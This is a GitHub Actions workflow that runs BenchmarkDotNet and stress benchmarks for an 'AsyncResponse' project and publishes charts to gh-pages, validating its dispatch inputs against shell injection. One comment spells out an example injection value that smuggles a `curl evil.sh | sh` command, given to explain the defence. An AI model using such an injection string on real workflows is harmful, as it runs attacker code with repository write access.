name: Benchmarks

# Tracks performance over time. Runs the BenchmarkDotNet micro-benchmarks and the in-process load
# stress harness, then publishes both to the `gh-pages` branch via github-action-benchmark, which
# renders charts at https://<owner>.github.io/<repo>/dev/bench/ and alerts on regressions.
on:
  push:
    branches: [main]
    paths:
      - '**/*.cs'
      - '**/*.csproj'
      - '**/*.slnx'
      - '**/*.props'
      - '**/*.targets'
      - 'global.json'
      - '.github/workflows/benchmarks.yml'
  workflow_dispatch:
    inputs:
      benchmark_filter:
        description: 'BenchmarkDotNet filter, e.g. *RedisAckDispatch*'
        default: '*'
      benchmark_job:
        description: 'BenchmarkDotNet job, e.g. short'
        default: 'short'
      stress_concurrency:
        description: 'Stress harness concurrency'
        default: '256'
      stress_count:
        description: 'Stress harness operation count'
        default: '25000'
      stress_fanout:
        description: 'Shared-correlation fanout'
        default: '4'
      stress_timeout_count:
        description: 'Short-timeout waiter count'
        default: '2000'
      stress_timeout_ms:
        description: 'Short-timeout duration in milliseconds'
        default: '50'

# github-action-benchmark commits the results history to gh-pages.
permissions:
  contents: write

# Shared with the load-test workflow so the two never race on the gh-pages history (both publish to
# the same dev/bench dashboard).
concurrency:
  group: benchmark-publish
  cancel-in-progress: false

jobs:
  benchmark:
    runs-on: ubuntu-latest
    timeout-minutes: 45
    steps:
      - uses: actions/checkout@3d3c42e5aac5ba805825da76410c181273ba90b1 # v7.0.1

      - name: Setup .NET
        uses: actions/setup-dotnet@a98b56852c35b8e3190ac28c8c2271da59106c68 # v6.0.0
        with:
          dotnet-version: |
            8.0.x
            10.0.x

      # A "short" job keeps CI fast; trends (not absolute numbers) are what matter on shared runners.
      #
      # Every dispatch input reaches the shell through `env:`, never through `${{ }}` inside `run:`.
      # GitHub substitutes expressions BEFORE the shell parses the script, so an interpolated input
      # is not an argument — it is source. A filter of `x" ; curl evil.sh | sh ; echo "` would have
      # run as its own command, on a runner whose token carries `contents: write`. Quoted `$VAR`
      # expansion happens after parsing and cannot introduce syntax.
      - name: Run BenchmarkDotNet
        env:
          BENCHMARK_FILTER: ${{ github.event.inputs.benchmark_filter || '*' }}
          BENCHMARK_JOB: ${{ github.event.inputs.benchmark_job || 'short' }}
        run: |
          case "$BENCHMARK_JOB" in
            default|dry|short|medium|long|verylong) ;;
            *) echo "::error::benchmark_job must be one of: default, dry, short, medium, long, verylong."; exit 1 ;;
          esac
          dotnet run -c Release --project benchmarks/AsyncResponse.Benchmarks -- \
            --filter "$BENCHMARK_FILTER" \
            --job "$BENCHMARK_JOB"

      # BenchmarkSwitcher writes one report per benchmark class; merge their Benchmarks arrays into the
      # single file github-action-benchmark expects.
      - name: Merge BenchmarkDotNet reports
        run: |
          reports=$(find . -path '*BenchmarkDotNet.Artifacts/results/*-report-full-compressed.json')
          echo "Merging reports:"; echo "$reports"
          jq -s '{ Benchmarks: (map(.Benchmarks) | add) }' $reports > "${{ github.workspace }}/benchmark-report.json"
          echo "Total benchmarks: $(jq '.Benchmarks | length' "${{ github.workspace }}/benchmark-report.json")"

      - name: Publish BenchmarkDotNet results
        uses: benchmark-action/github-action-benchmark@52576c92bccf6ac60c8223ec7eb2565637cae9ba # v1
        with:
          name: AsyncResponse Microbenchmarks
          tool: benchmarkdotnet
          output-file-path: benchmark-report.json
          github-token: ${{ secrets.GITHUB_TOKEN }}
          auto-push: true
          gh-pages-branch: gh-pages
          benchmark-data-dir-path: dev/bench
          alert-threshold: '150%'
          comment-on-alert: true
          fail-on-alert: false
          summary-always: true

      # Asserts correctness under load (process exits non-zero on a violation, failing the job) and
      # writes throughput/latency/allocation series for charting.
      - name: Run stress harness
        env:
          STRESS_CONCURRENCY: ${{ github.event.inputs.stress_concurrency || '256' }}
          STRESS_COUNT: ${{ github.event.inputs.stress_count || '25000' }}
          STRESS_FANOUT: ${{ github.event.inputs.stress_fanout || '4' }}
          STRESS_TIMEOUT_COUNT: ${{ github.event.inputs.stress_timeout_count || '2000' }}
          STRESS_TIMEOUT_MS: ${{ github.event.inputs.stress_timeout_ms || '50' }}
        run: |
          # Every stress knob is numeric; reject anything else outright rather than passing it on.
          for var in STRESS_CONCURRENCY STRESS_COUNT STRESS_FANOUT STRESS_TIMEOUT_COUNT STRESS_TIMEOUT_MS; do
            value="${!var}"
            case "$value" in
              ''|*[!0-9]*) echo "::error::$var must be a non-negative integer (got '$value')."; exit 1 ;;
            esac
          done
          dotnet run -c Release --project benchmarks/AsyncResponse.Benchmarks -- \
            stress \
            --concurrency "$STRESS_CONCURRENCY" \
            --count "$STRESS_COUNT" \
            --progress 5 \
            --fanout "$STRESS_FANOUT" \
            --timeout-count "$STRESS_TIMEOUT_COUNT" \
            --timeout-ms "$STRESS_TIMEOUT_MS" \
            --json "${{ github.workspace }}/stress"

      - name: Publish stress throughput (bigger is better)
        uses: benchmark-action/github-action-benchmark@52576c92bccf6ac60c8223ec7eb2565637cae9ba # v1
        with:
          name: AsyncResponse Stress - throughput
          tool: customBiggerIsBetter
          output-file-path: stress.bigger.json
          github-token: ${{ secrets.GITHUB_TOKEN }}
          auto-push: true
          gh-pages-branch: gh-pages
          benchmark-data-dir-path: dev/bench
          alert-threshold: '150%'
          comment-on-alert: true
          fail-on-alert: false
          summary-always: true

      - name: Publish stress latency & allocations (smaller is better)
        uses: benchmark-action/github-action-benchmark@52576c92bccf6ac60c8223ec7eb2565637cae9ba # v1
        with:
          name: AsyncResponse Stress - latency & allocations
          tool: customSmallerIsBetter
          output-file-path: stress.smaller.json
          github-token: ${{ secrets.GITHUB_TOKEN }}
          auto-push: true
          gh-pages-branch: gh-pages
          benchmark-data-dir-path: dev/bench
          alert-threshold: '150%'
          comment-on-alert: true
          fail-on-alert: false
          summary-always: true

      - name: Upload raw results
        if: always()
        uses: actions/upload-artifact@043fb46d1a93c77aae656e7c1c64a875d1fc6a0a # v7.0.1
        with:
          name: benchmark-results
          path: |
            benchmark-report.json
            stress.bigger.json
            stress.smaller.json
            **/BenchmarkDotNet.Artifacts/results/*
